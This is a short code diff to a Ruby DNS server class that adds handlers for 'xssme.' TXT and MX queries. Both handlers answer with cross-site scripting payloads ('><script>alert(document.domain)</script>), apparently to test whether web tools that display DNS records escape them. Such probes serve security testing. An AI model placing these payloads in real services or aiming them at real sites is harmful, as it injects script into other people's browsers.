@@ -65,6 +65,22 @@ class DriverDNS
     RubyDNS::run_server(:listen => interfaces) do |s|
       s.logger.level = Logger::FATAL
 
+      match(/^xssme\.#{domain}$/, IN::TXT) do |transaction|
+        response = "'>\"><script>alert(document.domain)</script>"
+        puts("Got a xssme request! Responding with: " + response)
+        transaction.respond!(response)
+
+        transaction
+      end
+
+      match(/^xssme\.#{domain}$/, IN::MX) do |transaction|
+        response = "'>\"><script>alert(\"XSS: \" + document.domain)</script>"
+        puts("Got a xssme request! Responding with: " + response)
+        transaction.respond!(0, [response])
+
+        transaction
+      end
+
       match(/\.#{domain}$/, IN::TXT) do |transaction|
         begin
           name, domain = DriverDNS.parse_name(transaction.name, domain)
